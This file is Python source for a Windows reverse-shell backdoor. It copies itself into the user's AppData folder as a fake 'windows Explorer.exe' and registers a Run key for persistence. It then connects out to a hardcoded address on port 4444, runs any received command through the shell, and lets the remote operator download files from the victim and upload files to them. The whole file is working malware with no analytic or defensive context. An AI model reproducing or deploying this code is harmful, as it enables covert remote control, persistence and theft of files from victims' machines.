import socket
import subprocess
import json
import os
import base64
import sys
import shutil

class Backdoor:

	def __init__(self,ip,port):
		self.go_persistence()
		self.connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.connection.connect((ip, port))

	def go_persistence(self):
		persistent_backdoor_location = os.environ["appdata"] + "\\windows Explorer.exe"
		if not os.path.exists(persistent_backdoor_location):
			shutil.copy(sys.executable, persistent_backdoor_location)
			subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + persistent_backdoor_location + '"')
  
	def safe_send(self,data):
		json_data = json.dumps(data)
		self.connection.send(json_data)

	def safe_receive(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.connection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				continue

	def execute_commmands(self,command):
		DEVNULL = open(os.devnull, "wb")
		return subprocess.check_output(command,shell=True, stderr=DEVNULL, stdin=DEVNULL)

	def change_path(self,path):
		os.chdir(path)
		return "[+] Change path to " + path

	def write_file(self,path,content):
		with open(path,"wb") as file:
			file.write(base64.b64decode(content))
			return "[+] Upload was Succesful"

	def read_file(self,path):
		with open(path,"rb") as file:
			return base64.b64encode(file.read())

	def run(self):
		while True:
			command = self.safe_receive()

			try:
				if command[0] == "exit":
					self.connection.close()
					sys.exit()
				elif command[0] == "cd" and len(command) > 1:
					command_result = self.change_path(command[1])
				elif command[0] == "download":
					command_result = self.read_file(command[1])
				elif command[0] == "upload":
					command_result = self.write_file(command[1],command[2])

				else:
					command_result = self.execute_commmands(command)

			except Exception:
				command_result = "[-] There is an error on the command"

			self.safe_send(command_result)


my_backdoor = Backdoor("192.168.29.137", 4444)
my_backdoor.run()